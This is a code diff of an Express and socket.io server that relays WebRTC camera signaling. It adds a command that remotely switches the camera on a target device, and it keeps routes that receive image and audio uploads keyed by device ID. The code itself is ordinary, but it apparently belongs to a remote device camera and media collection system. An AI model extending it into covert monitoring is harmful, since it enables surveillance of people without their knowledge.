@@ -46,7 +46,7 @@ app.use(express.static(__dirname));
 let devicesStatus = {}; 
 
 // ==================================================
-//  🔥 MAIN SOCKET LOGIC
+//  🔥 MAIN SOCKET LOGIC (UPDATED)
 // ==================================================
 io.on('connection', (socket) => {
     
@@ -94,7 +94,7 @@ io.on('connection', (socket) => {
     });
 
     // =========================================
-    // 🔥 FIXED: WEBRTC SIGNALING (V2)
+    // 🔥 FIXED: WEBRTC SIGNALING (Live Camera)
     // =========================================
     
     socket.on("offer", (data) => {
@@ -124,6 +124,14 @@ io.on('connection', (socket) => {
         }
     });
 
+    // 🔥 NEW: SWITCH CAMERA LOGIC ADDED HERE
+    socket.on("switch-camera", (data) => {
+        if (data && data.target) {
+            console.log(`🔄 Switch Camera Command -> ${data.target}`);
+            io.to(data.target).emit("switch-camera");
+        }
+    });
+
     // =========================================
 
 
@@ -133,14 +141,11 @@ io.on('connection', (socket) => {
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server Running: WebRTC Safe Mode');
+    res.send('✅ Server Running: WebRTC Safe Mode + Switch Cam');
 });
 
-// ... Baki saara API code same rakho (Uploads, Gallery etc.) ...
-// (Code truncation for brevity, keep your existing API routes below)
-
 // ==================================================
-//  ✅ API ROUTES (Keep your existing logic below)
+//  ✅ API ROUTES (UNCHANGED)
 // ==================================================
 app.post('/api/upload-image', (req, res) => {
     let { device_id, image_data, type } = req.body; 
@@ -166,8 +171,6 @@ app.post('/api/upload-image', (req, res) => {
         }
     );
 });
-
-// ... Paste rest of your API routes here (Audio, Status, Upload Data) ...
 
 app.post('/api/upload-audio', (req, res) => {
     let { device_id, audio_data, filename } = req.body; 
